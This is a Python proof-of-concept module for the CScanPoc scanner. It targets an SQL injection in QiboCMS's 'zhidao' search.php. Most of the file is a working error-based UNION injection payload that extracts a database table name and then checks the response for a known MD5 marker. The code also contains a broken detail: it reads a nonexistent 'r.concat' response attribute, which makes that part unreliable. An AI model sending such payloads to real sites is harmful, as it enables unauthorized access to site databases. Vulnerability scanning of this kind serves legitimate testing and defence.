# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0003' # 平台漏洞编号，留空
    name = 'qibocms知道系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-05-20'  # 漏洞公布时间
    desc = '''
        
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = '*'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '6e13e0c0-c0c9-4783-95b2-f998237a281b'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = "/zhidao/search.php?&tags=ll%20ll%20ll&keyword=111&fulltext[]=11%29%20and%201=2%20union%20select%201%20from%20%28select%20count%28*%29,concat%28md5%281234%29,%20floor%28rand%280%29*2%29,%28select%20table_name%20from%20information_schema.tables%20where%20table_schema=database%28%29%20limit%200,1%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%23"
            url = self.target + payload
            r = requests.get(url)
            if r.status_code == 200 and '81dc9bdb52d04dc20036dbd8313ed055' in r.concat:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
